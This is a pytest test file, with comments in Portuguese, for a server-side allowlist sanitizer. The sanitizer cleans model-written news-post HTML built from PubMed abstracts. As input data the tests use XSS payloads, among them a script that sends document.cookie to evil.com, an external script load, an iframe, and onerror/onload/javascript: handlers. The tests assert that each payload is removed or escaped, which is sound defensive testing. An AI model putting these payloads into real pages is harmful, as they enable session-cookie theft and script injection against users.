"""
O HTML dos posts de notícia é sanitizado NO SERVIDOR, por lista de permissão.

O corpo é escrito por um modelo a partir de um abstract do PubMed: texto de
terceiro dentro de um prompt. A única barreira contra `<script>` era o navegador.
"""

import pytest

from app.services.html_seguro import sanitizar_html_de_post
from app.services.news_writer_service import _citacao_html


def test_o_que_o_post_precisa_passa_intacto():
    html = "<p>Contexto <strong>clínico</strong> e <em>achados</em>.</p><ul><li>Um</li><li>Dois</li></ul>"

    assert sanitizar_html_de_post(html) == html


@pytest.mark.parametrize("ataque", [
    "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
    "<SCRIPT SRC=//evil.com/x.js></SCRIPT>",
    "<style>body{display:none}</style>",
    "<iframe src='https://evil.com'></iframe>",
])
def test_script_e_afins_somem_com_o_conteudo(ataque):
    limpo = sanitizar_html_de_post(f"<p>antes</p>{ataque}<p>depois</p>")

    assert limpo == "<p>antes</p><p>depois</p>"


@pytest.mark.parametrize("ataque", [
    '<img src=x onerror="alert(1)">',
    '<a href="javascript:alert(1)">clique</a>',
    '<p onclick="alert(1)" style="position:fixed">texto</p>',
    '<svg onload=alert(1)>',
])
def test_nenhum_atributo_sobrevive(ataque):
    limpo = sanitizar_html_de_post(ataque)

    for proibido in ("onerror", "onclick", "onload", "javascript:", "style=", "href", "<img", "<svg", "<a"):
        assert proibido not in limpo.lower()


def test_link_perde_a_tag_e_mantem_o_texto():
    """O post não tem link no corpo: dentro do iframe ele tiraria o médico da plataforma."""
    assert sanitizar_html_de_post('<p>Veja <a href="https://x.com">o estudo</a>.</p>') == "<p>Veja o estudo.</p>"


def test_sinal_de_menor_no_texto_continua_sendo_texto():
    assert sanitizar_html_de_post("<p>p&lt;0,05 e IL-6 &lt;10</p>") == "<p>p&lt;0,05 e IL-6 &lt;10</p>"


def test_script_escapado_nao_vira_script():
    limpo = sanitizar_html_de_post("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>")

    assert "<script" not in limpo
    assert "&lt;script&gt;" in limpo


def test_html_malformado_nao_levanta():
    assert "texto" in sanitizar_html_de_post("<p>texto<strong>sem fechar<ul><li>item")
    assert sanitizar_html_de_post("") == ""
    assert sanitizar_html_de_post(None) == ""


# ── A linha de fonte ─────────────────────────────────────────────────────────

class _Artigo:
    def __init__(self, authors, original_title):
        self.authors = authors
        self.original_title = original_title


def test_titulo_com_sinal_de_menor_nao_quebra_a_marcacao():
    html = _citacao_html(_Artigo("Silva J", "IL-6 <10 pg/mL as a predictor (p<0.05)"), "Lancet")

    assert "IL-6 &lt;10 pg/mL" in html
    assert html.startswith("<p><em>Fonte: ") and html.endswith("</em></p>")


def test_autor_e_titulo_hostis_sao_escapados():
    html = _citacao_html(_Artigo("<img src=x onerror=alert(1)>", "<script>alert(1)</script>"), "J<b>x")

    assert "<script" not in html and "<img" not in html and "<b>" not in html
    assert "&lt;script&gt;" in html
